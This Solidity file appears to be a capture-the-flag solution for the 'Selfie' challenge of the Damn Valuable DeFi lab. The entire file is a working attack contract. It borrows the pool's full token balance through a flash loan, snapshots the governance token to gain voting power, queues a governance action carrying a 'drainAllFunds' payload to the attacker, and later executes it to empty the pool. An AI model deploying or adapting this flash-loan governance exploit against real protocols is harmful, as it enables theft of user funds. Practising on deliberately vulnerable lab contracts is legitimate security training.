// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";

interface IFlashLoanReceiver {
    function receiveFlashLoan(uint256 amount) external;

    error SenderIsNotFlashLoanerPool();

    error SenderIsNotOwner();
}

interface ISelfiePool {
    function flashLoan(uint256 amount) external;
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

contract FlashLoanReceiver {
    using Address for address;

    address private _attacker;
    DamnValuableTokenSnapshot private _dvtSnap;
    ISimpleGovernance private _simpleGovernance;
    ISelfiePool private _selfiePool;
    uint256 private actionId;

    error SenderIsNotSelfiePool();
    error SenderIsNotOwner();
    error TransferFail();
    error CallFailed();

    constructor(
        address selfiePool,
        address simpleGovernanceAddress,
        address dvtAddress
    ) {
        _attacker = msg.sender;
        _selfiePool = ISelfiePool(selfiePool);
        _simpleGovernance = ISimpleGovernance(simpleGovernanceAddress);
        _dvtSnap = DamnValuableTokenSnapshot(dvtAddress);
    }

    function attack() external {
        if (msg.sender != _attacker) revert SenderIsNotOwner();
        // Just take everything
        uint256 everything = _dvtSnap.balanceOf(address(_selfiePool));
        assert(everything == 1_500_000e18);
        // And flashloan it
        _selfiePool.flashLoan(everything);
    }

    function receiveTokens(address token, uint256 amount) external {
        if (msg.sender != address(_selfiePool)) revert SenderIsNotSelfiePool();
        // Crafting the data to drain all the pool.
        bytes memory evilPayload = abi.encodeWithSignature(
            "drainAllFunds(address)",
            _attacker
        );
        //Create a snapshot of the governance token while the attacker's contract have 1.5 millions of it
        _dvtSnap.snapshot();
        // Queue a proposal to drain all funds of the selfiePool contract
        actionId = _simpleGovernance.queueAction(
            address(_selfiePool),
            evilPayload,
            0
        );

        // Refunding the pool
        _dvtSnap.transfer(address(_selfiePool), amount);
    }

    // After the action delay of 2 days, drain all the funds by executing the proposal
    function drainAllFunds() external {
        if (msg.sender != _attacker) revert SenderIsNotOwner();
        _simpleGovernance.executeAction(actionId);
    }
}
